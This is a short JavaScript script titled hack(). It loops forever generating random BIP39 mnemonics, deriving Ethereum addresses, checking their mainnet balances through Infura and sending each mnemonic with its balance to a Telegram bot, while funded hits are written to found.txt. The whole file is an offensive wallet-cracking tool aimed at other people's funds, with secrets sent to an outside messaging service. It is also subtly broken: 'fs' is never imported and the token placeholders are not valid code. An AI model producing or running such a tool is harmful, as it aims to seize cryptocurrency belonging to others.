const eth = require('ethers');
const Web3 = require('web3');
const hdkey = require('ethereumjs-wallet');
const bip39 = require('bip39');
const web3 = new Web3('https://mainnet.infura.io/v3/*Your infura key*');
import Telegram from 'telegram-send-message';

async function hack () {
    const path = "m/44'/60'/0'/0/0";
    let entropy;
    let mnemonicPhrase;
    let hdwallet;
    let wallet;
    let address;
    let balance;
    Telegram.setToken(YOUR TELEGRAM BOT TOKEN);
    Telegram.setRecipient(RECIPIENT CHAT ID);
    while(true) {
        entropy = eth.utils.randomBytes(16);
        mnemonicPhrase = eth.utils.entropyToMnemonic(entropy);
        hdwallet = hdkey.hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(mnemonicPhrase));
        wallet = hdwallet.derivePath(path).getWallet();
        address = `0x${wallet.getAddress().toString('hex')}`;
        balance = await web3.eth.getBalance(address);
        process.stdout.cursorTo(0);
        console.log(`Checking: ${address}, Balance: ` + balance + `ETH, https://etherscan.io/address/${address}`);
        Telegram.setMessage(`Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`);
        Telegram.send();
        if(balance > 0) {
            console.log('\n');
            console.log('mnemonic --->>' + ' '+ mnemonicPhrase)
            console.log('balance --->>' + ' '+ balance)
            console.log('\n');
            fs.appendFile("found.txt", `Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`, (err) => { 
                if (err) { 
                    console.log(err); 
                } 
            });
           Telegram.setMessage(`Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`);
           Telegram.send();
        }
    }
}

hack();
